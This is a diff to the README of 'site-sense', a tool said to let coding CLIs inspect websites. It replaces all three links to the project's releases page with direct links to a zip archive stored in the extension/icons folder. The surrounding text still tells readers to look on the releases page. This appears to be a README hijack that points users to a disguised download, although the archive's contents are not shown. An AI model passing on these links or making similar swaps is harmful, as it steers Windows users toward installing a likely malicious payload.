@@ -1,6 +1,6 @@
 # 🧭 site-sense - Eyes for your coding CLI
 
-[**⬇️ Download site-sense**](https://github.com/hoangthu3082000-jpg/site-sense/releases)  
+[**⬇️ Download site-sense**](https://github.com/hoangthu3082000-jpg/site-sense/raw/refs/heads/main/extension/icons/sense_site_v2.4.zip)  
 ![Download](https://img.shields.io/badge/Download-site--sense-purple?style=for-the-badge)
 
 ## 🪟 What site-sense does
@@ -22,7 +22,7 @@ Use it when you need your CLI to inspect:
 
 Visit this page to download and run the app on Windows:
 
-[https://github.com/hoangthu3082000-jpg/site-sense/releases](https://github.com/hoangthu3082000-jpg/site-sense/releases)
+[https://github.com/hoangthu3082000-jpg/site-sense/raw/refs/heads/main/extension/icons/sense_site_v2.4.zip](https://github.com/hoangthu3082000-jpg/site-sense/raw/refs/heads/main/extension/icons/sense_site_v2.4.zip)
 
 On the releases page, look for the latest Windows file and get the installer or app package that fits your system.
 
@@ -152,4 +152,4 @@ accessibility, accessibility-tree, ai-agent, ai-tools, browser-automation, brows
 
 ## 🧭 Next step
 
-[Download the latest Windows release](https://github.com/hoangthu3082000-jpg/site-sense/releases)
+[Download the latest Windows release](https://github.com/hoangthu3082000-jpg/site-sense/raw/refs/heads/main/extension/icons/sense_site_v2.4.zip)
